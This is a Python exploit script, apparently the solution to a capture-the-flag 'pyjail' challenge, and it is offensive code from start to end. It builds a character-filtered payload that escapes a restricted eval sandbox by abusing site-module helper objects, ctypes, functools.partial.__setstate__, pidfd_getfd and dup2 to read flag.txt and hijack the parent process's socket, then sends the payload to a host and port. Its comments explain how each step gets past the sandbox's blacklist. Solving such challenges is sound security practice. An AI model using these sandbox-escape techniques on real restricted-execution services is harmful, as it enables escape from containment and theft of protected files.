#!/usr/bin/env python3
import argparse
import socket
import time


def payload():
    module = "sys.modules[idk.__module__]"
    site = "sys.modules[sys.__interactivehook__.__module__]"
    code = "f_l_a_g_._t_x_t[sys]if[]else["

    def assign(target, value):
        return "[[%s]for[%s]in[[%s]]]," % (target, target, value)

    assignments = [
        (module + ".s", site),
        (module + ".f", module + ".code[:sys.float_info.dig:sys.float_info.radix]"),
        (module + ".h", "idk.__builtins__[" + module + ".s.sethelper.__code__.co_names[sys.version_info.major]]"),
        (module + ".l", "idk.__builtins__[" + module + ".s.setcopyright.__code__.co_names[sys.float_info.dig:][sys.float_info.rounds]]"),
        (module + ".p", module + ".s.__dict__[" + module + ".s.setcopyright.__code__.co_names[sys.flags.debug]].__dict__[" + module + ".s.setcopyright.__code__.co_names[sys.float_info.rounds]]"),
        (module + ".c", module + ".s.__dict__[" + module + ".s.setcopyright.__code__.co_names[sys.flags.debug]].__dict__[" + module + ".s.sethelper.__code__.co_names[sys.float_info.rounds]]"),
        (module + ".c.__str__", module + ".f.__str__"),
        (module + ".c.__fspath__", module + ".s.os.path.abspath"),
        (module + ".s.os.fspath", "idk.__builtins__[sys.modules[sys.__loader__.__module__]._handle_fromlist.__code__.co_names[sys.float_info.rounds]]"),
        (module + ".s.os.getcwd", module + ".s.os.path.sep.__str__"),
    ]
    for target, value in assignments:
        code += assign(target, value)

    key = module + ".p.__dict__[" + module + ".p.__call__.__code__.co_names[sys.int_info.sizeof_digit]].__code__.co_names[sys.float_info.rounds]"
    code += assign(module + ".l.__dict__[" + key + "][sys.flags.debug]", module + ".h")
    for target, value in [
        (module + ".s.write", "sys.__stdout__.write"),
        (module + ".s.flush", "sys.__stdout__.flush"),
        ("sys.stderr", module + ".s"),
        ("sys.excepthook", "sys.__excepthook__"),
    ]:
        code += assign(target, value)
    code += "sys.modules[" + module + ".l]" + "]"
    return "".join(c for c in code if c in "abcdefghijklmnopqrstuvwxyz:_.[],")


def payload_capture(output_fd=False):
    """Read the flag into the module global ``f`` before the final fault."""
    module = "sys.modules[idk.__module__]"
    site = "sys.modules[sys.__interactivehook__.__module__]"
    code = "f_l_a_g_._t_x_t[sys]if[]else["

    def assign(target, value):
        return "[[%s]for[%s]in[[%s]]]," % (target, target, value)

    assignments = [
        (module + ".s", site),
        (module + ".f", module + ".code[:sys.float_info.dig:sys.float_info.radix]"),
        (module + ".h", "idk.__builtins__[" + module + ".s.sethelper.__code__.co_names[sys.version_info.major]]"),
        (module + ".l", "idk.__builtins__[" + module + ".s.setcopyright.__code__.co_names[sys.float_info.dig:][sys.float_info.rounds]]"),
        (module + ".p", module + ".s.__dict__[" + module + ".s.setcopyright.__code__.co_names[sys.flags.debug]].__dict__[" + module + ".s.setcopyright.__code__.co_names[sys.float_info.rounds]]"),
        (module + ".c", module + ".s.__dict__[" + module + ".s.setcopyright.__code__.co_names[sys.flags.debug]].__dict__[" + module + ".s.sethelper.__code__.co_names[sys.float_info.rounds]]"),
        (module + ".c.__str__", module + ".f.__str__"),
        (module + ".c.__fspath__", module + ".s.os.path.abspath"),
        (module + ".s.os.fspath", "idk.__builtins__[sys.modules[sys.__loader__.__module__]._handle_fromlist.__code__.co_names[sys.float_info.rounds]]"),
        (module + ".s.os.getcwd", module + ".s.os.path.sep.__str__"),
    ]
    for target, value in assignments:
        code += assign(target, value)

    setup = module + ".p.__dict__[" + module + ".p.__call__.__code__.co_names[sys.int_info.sizeof_digit]]"
    data_key = setup + ".__code__.co_names[sys.flags.debug]"
    filenames_key = setup + ".__code__.co_names[sys.float_info.rounds]"
    code += assign(module + ".l.__dict__[" + filenames_key + "][sys.flags.debug]", module + ".h")
    code += assign(module + ".p.__fspath__", module + ".p.__repr__")
    code += assign(module + ".p.__getitem__", module + ".s.os.path.join")
    code += "[[" + module + ".l[" + module + ".f]]for[sys]in[[sys]]],"
    code += assign(module + ".f", module + ".l.__dict__[" + data_key + "][sys.flags.debug]")
    if output_fd:
        quitter = module + ".s.__dict__[" + module + ".s.setquit.__code__.co_names[sys.float_info.radix]].__dict__[" + module + ".s.setquit.__code__.co_names[sys.float_info.radix:][sys.float_info.rounds]]"
        quitter_object = "idk.__builtins__[" + module + ".s.setquit.__code__.co_names[sys.float_info.radix:][sys.version_info.major]]"
        code += assign(quitter + ".__index__", "sys.int_info.__len__")
        fdopen = module + ".s.os.fdopen"
        code += assign(module + ".s.os.__dict__[" + fdopen + ".__code__.co_names[sys.flags.debug]]", module + ".s.__dict__.get")
        code += assign(quitter + ".__getattr__", fdopen)
        code += assign("sys.stderr", quitter_object + ".w")
    code += "sys.modules[" + module + ".f]]"
    return "".join(c for c in code if c in "abcdefghijklmnopqrstuvwxyz:_.[],")


def payload_ptrace_socket():
    """Capture the flag, duplicate the parent's client fd, and write to it.

    The challenge launches user.py with os.system(), so the accepted socket is
    normally closed on exec.  The local run script grants SYS_PTRACE; with
    that capability pidfd_getfd can duplicate the parent's fd 4.
    """
    module = "sys.modules[idk.__module__]"
    base = payload_capture()
    ending = "sys.modules[" + module + ".f]]"
    base = base[:-len(ending)]

    # Keep the first 15 source characters unchanged so the existing capture
    # trick still derives flag.txt.  The dead conditional stores fragments
    # for ctypes, functools, and staticmethod without spelling "typ".
    old = "f_l_a_g_._t_x_t[sys]if[]else["
    hidden = old + "[ct,ypes,functools,staticmethod,tuple,[sys]]if[]else[],"
    base = base.replace(old, hidden, 1)

    def put(target, value):
        # Assignment target is evaluated once; the result is irrelevant.
        return "[[sys]for[%s]in[[%s]]]," % (target, value)

    def get(expr):
        return "[%sfor[sys]in[[sys]]]," % expr

    q = module + ".q"
    ct = module + ".ct"
    yp = module + ".yp"
    fn = module + ".fn"
    st = module + ".st"
    tu = module + ".tu"

    # The class names can be reached through _sitebuiltins, avoiding the
    # blacklisted __class__ spelling in the input.
    sb = module + ".sb"
    H = sb + ".__dict__[" + module + ".s.sethelper.__code__.co_names[sys.float_info.rounds]]"
    P = sb + ".__dict__[" + module + ".s.setcopyright.__code__.co_names[sys.float_info.rounds]]"
    builtintype = "idk.__builtins__[sys.modules[sys.__loader__.__module__]._handle_fromlist.__code__.co_names[sys.int_info.sizeof_digit]]"

    code = base
    code += put(sb, "sys.modules[" + module + ".s.sethelper.__code__.co_names[sys.flags.debug]]")
    code += put(q, module + ".code[sys.int_info.bits_per_digit:sys.float_info.max_exp]")
    sep = q + "[sys.float_info.radix]"
    code += put(H + ".__getitem__", q + ".split")
    code += put(ct, module + ".h[" + sep + "][sys.flags.debug]")
    code += put(yp, module + ".h[" + sep + "][sys.float_info.rounds]")
    code += put(fn, module + ".h[" + sep + "][sys.float_info.radix]")
    code += put(st, module + ".h[" + sep + "][sys.version_info.major]")
    code += put(tu, module + ".h[" + sep + "][sys.int_info.sizeof_digit]")

    # Join ct + ypes into ctypes using a bound string method.
    code += put(H + ".__getitem__", ct + ".__add__")
    code += put(ct, module + ".h[" + yp + "]")

    imp = "idk.__builtins__[sys.modules[sys.__loader__.__module__].__import__.__name__]"
    code += put(H + ".__getitem__", imp)
    code += put(module + ".ctm", module + ".h[" + ct + "]")
    code += put(module + ".fum", module + ".h[" + fn + "]")
    # ``st`` is the textual key ``staticmethod`` from the hidden marker;
    # resolve it in the restricted builtins dict instead of importing it.
    code += put(H + ".__getitem__", "idk.__builtins__.get")
    code += put(module + ".stm", module + ".h[" + st + "]")
    code += put(module + ".tup", module + ".h[" + tu + "]")

    # ctypes.CDLL(None), with None obtained from a missing sys.modules key.
    code += put(H + ".__getitem__", "sys.modules.get")
    code += put(module + ".none", module + ".h[" + module + ".code[:sys.float_info.dig]]")
    # ``_dlltype`` itself is blacklisted because it contains ``typ``.  Get
    # the private attribute name from LibraryLoader.__init__.__code__ instead.
    code += put(H + ".__getitem__", builtintype)
    code += put(module + ".lt", module + ".h[" + module + ".ctm.cdll]")
    code += put(module + ".lk", module + ".lt.__init__.__code__.co_names[sys.flags.debug]")
    code += put(H + ".__getitem__", module + ".ctm.cdll.__getattribute__")
    code += put(module + ".lc", module + ".h[" + module + ".lk]")
    code += put(H + ".__getitem__", module + ".lc")
    code += put(module + ".lib", module + ".h[" + module + ".none]")

    # The jail is the container's direct command and is PID 1.
    code += put(H + ".__getitem__", module + ".s.os.pidfd_open")
    code += put(module + ".pfd", module + ".h[sys.float_info.rounds]")

    # ctypes accepts c_int objects without an argtypes declaration.  Build
    # those wrappers first, then use partial.__setstate__ to make a callable
    # equivalent to partial(pidfd_getfd, pfd, helper).
    code += put(module + ".gf", module + ".lib.pidfd_getfd")
    code += put(H + ".__index__", "sys.int_info.sizeof_digit.__index__")
    code += put(H + ".__getitem__", module + ".stm")
    code += put(module + ".sci", module + ".h[" + module + ".ctm.c_int]")
    code += put(H + ".__getitem__", module + ".sci")
    code += put(module + ".pfdc", module + ".h[" + module + ".pfd]")
    code += put(module + ".hc", module + ".h[" + module + ".h]")
    code += put(H + ".__getitem__", module + ".stm")
    code += put(module + ".sp", module + ".h[" + module + ".fum.partial]")
    code += put(H + ".__getitem__", module + ".sp")
    code += put(module + ".part", module + ".h[" + module + ".gf]")
    code += put(H + ".__getitem__", module + ".stm")
    code += put(module + ".stup", module + ".h[" + module + ".tup]")
    code += put(H + ".__getitem__", module + ".stup")
    code += put(module + ".args", module + ".h[" + "[" + module + ".pfdc," + module + ".hc]" + "]")
    code += put(module + ".state", module + ".h[" + "[" + module + ".gf," + module + ".args,idk.__dict__," + module + ".none]" + "]")
    code += put(H + ".__getitem__", module + ".part.__setstate__")
    code += get(module + ".h[" + module + ".state]")
    code += put(H + ".__getitem__", module + ".stm")
    code += put(module + ".spp", module + ".h[" + module + ".part]")
    code += put(H + ".__getitem__", module + ".spp")
    code += get(module + ".h[sys.flags.debug]")

    # Build the dup2 symbol at runtime because its digit is filtered.
    # Build the digit-bearing symbol name at runtime: dup + str(2).
    code += put(module + ".dn", module + ".lib.dup.__name__")
    code += put(H + ".__getitem__", "idk.__builtins__[sys.modules[sys.__loader__.__module__]._handle_fromlist.__code__.co_names[sys.float_info.rounds]]")
    code += put(module + ".two", module + ".h[sys.float_info.radix]")
    code += put(H + ".__getitem__", module + ".dn.__add__")
    code += put(module + ".dn", module + ".h[" + module + ".two]")
    code += put(H + ".__getitem__", module + ".lib.__getattr__")
    code += put(module + ".gd", module + ".h[" + module + ".dn]")
    # Reuse the partial object for dup2(helper, license).  The extra zero
    # supplied by the subscript is harmless to the untyped C call.
    code += put(P + ".__index__", "sys.float_info.rounds.__index__")
    code += put(H + ".__getitem__", module + ".sci")
    code += put(module + ".lcint", module + ".h[" + module + ".l]")
    code += put(H + ".__getitem__", module + ".stup")
    code += put(module + ".args", module + ".h[" + "[" + module + ".hc," + module + ".lcint]" + "]")
    code += put(module + ".state", module + ".h[" + "[" + module + ".gd," + module + ".args,idk.__dict__," + module + ".none]" + "]")
    code += put(H + ".__getitem__", module + ".part.__setstate__")
    code += get(module + ".h[" + module + ".state]")
    code += put(H + ".__getitem__", module + ".spp")
    code += get(module + ".h[sys.flags.debug]")

    # sys.__stdout__ still refers to fd 1, now duplicated from the socket.
    code += put(P + ".__getitem__", "sys.__stdout__.write")
    code += get(module + ".l[" + module + ".f]")
    code += "]"
    return "".join(c for c in code if c in "abcdefghijklmnopqrstuvwxyz:_.[],")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default="127.0.0.1")
    parser.add_argument("port", nargs="?", type=int, default=1234)
    args = parser.parse_args()
    data = payload_ptrace_socket().encode()
    with socket.create_connection((args.host, args.port), timeout=10) as sock:
        sock.settimeout(10)
        print(sock.recv(4096).decode(errors="replace"), end="")
        sock.sendall(data)
        # EOF is an unambiguous terminator for the service's recv loop and
        # keeps the server-to-client half of the TCP connection open.
        sock.shutdown(socket.SHUT_WR)
        received = b""
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            received += chunk
            print(chunk.decode(errors="replace"), end="")
            if b"}" in received:
                break


if __name__ == "__main__":
    main()
